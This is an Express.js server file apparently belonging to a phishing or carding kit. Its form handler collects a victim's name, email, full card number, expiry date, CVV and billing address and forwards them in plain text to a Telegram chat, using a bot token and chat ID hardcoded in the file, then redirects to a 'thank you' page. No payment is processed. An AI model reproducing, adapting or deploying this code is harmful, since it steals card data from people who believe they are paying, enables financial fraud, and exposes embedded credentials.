const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '6278639566:AAFOIuW6Gjd53XTJJSQUoWu83j9bQ540Th8';
const TELEGRAM_CHAT_ID = '-1002156953987';
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (your HTML, CSS, JS)
app.use(express.static('public'));

// Handle form submission
app.post('/submit', (req, res) => {
    const { fullName, email, cardNumber, expDate, cvv, billingAddress } = req.body;

    // Construct the message to send to Telegram
    const message = `
        New Payment Submission:
        Name: ${fullName}
        Email: ${email}
        Card Number: ${cardNumber}
        Expiration Date: ${expDate}
        CVV: ${cvv}
        Billing Address: ${billingAddress}
    `;

    // Send the message to Telegram
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    fetch(telegramURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            res.redirect('/thank-you');
        } else {
            res.send('Failed to send message. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        res.send('Error processing your request.');
    });
});

// Serve the thank you page
app.get('/thank-you', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'thank-you.html'));
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
